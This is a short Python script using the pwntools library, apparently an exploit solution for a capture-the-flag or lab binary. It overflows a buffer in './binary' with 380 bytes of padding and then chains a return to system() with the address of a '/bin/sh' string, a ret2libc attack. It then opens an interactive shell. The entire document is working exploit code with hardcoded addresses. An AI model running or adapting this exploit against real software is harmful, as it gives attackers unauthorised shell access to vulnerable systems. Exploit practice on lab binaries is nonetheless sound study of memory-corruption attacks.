from pwn import *

elf = ELF('./binary')
p = process('./binary')

system_addr = 0xf7dcdcd0
bin_sh_addr = 0x0804a008
fake_ret_addr = 0xdeadbeef
offset = 380

payload = b"A" * offset
payload += p32(system_addr)
payload += p32(fake_ret_addr)
payload += p32(bin_sh_addr)

p.sendline(payload)
p.interactive()
